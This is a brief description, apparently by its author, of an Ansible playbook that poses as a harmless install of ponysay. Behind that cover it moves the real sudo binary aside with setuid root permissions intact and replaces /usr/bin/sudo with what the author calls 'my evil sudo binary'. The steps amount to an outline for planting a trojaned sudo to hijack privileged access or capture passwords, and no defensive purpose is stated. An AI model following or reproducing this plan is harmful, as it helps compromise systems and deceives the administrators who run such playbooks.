This Ansible playbook does the following:

1. Installs `ponysay` on the system.
2. Moves `/usr/bin/sudo` to `/var/lib/apt/sudo`.
3. Sets proper ownership (`root:root`) and permissions (`4755`) for the moved `sudo` for it to still function.
4. Copies a file from the playbook directory to `/usr/bin/`, which replaces the sudo binary with my evil sudo binary.